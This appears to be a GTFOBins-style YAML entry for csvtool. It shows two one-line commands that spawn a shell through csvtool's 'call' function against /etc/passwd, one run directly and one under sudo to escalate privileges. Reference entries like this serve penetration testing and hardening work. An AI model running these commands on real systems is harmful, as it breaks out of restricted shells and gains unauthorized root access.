---
functions:
  shell:
    - code: csvtool call '/bin/sh;false' /etc/passwd
  sudo:
    - code: sudo csvtool call '/bin/sh;false' /etc/passwd
---
